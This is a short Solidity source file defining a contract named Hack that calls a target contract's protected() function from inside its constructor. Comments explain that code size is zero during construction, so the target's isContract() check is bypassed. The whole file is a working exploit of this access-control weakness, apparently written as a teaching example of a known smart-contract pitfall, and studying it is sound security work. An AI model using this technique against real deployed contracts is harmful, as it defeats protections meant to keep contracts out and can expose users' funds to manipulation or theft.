// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Target.sol";

contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}